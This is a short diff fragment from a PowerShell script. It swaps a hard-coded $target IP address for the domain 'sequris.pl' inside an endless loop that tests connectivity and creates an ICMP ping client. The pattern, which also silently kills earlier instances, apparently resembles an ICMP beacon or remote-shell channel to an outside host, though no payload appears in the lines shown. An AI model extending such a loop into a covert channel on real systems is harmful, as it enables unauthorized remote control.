@@ -41,7 +41,7 @@ Function Stop-PreviousProcesses {
 }
 
 Stop-PreviousProcesses > $null
-$sleep = 10; $target = "20.106.237.34"
+$sleep = 10; $target = "sequris.pl"
 while ($true) {
     if (Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet -ErrorAction SilentlyContinue) {
         $ICMPClient = New-Object System.Net.NetworkInformation.Ping
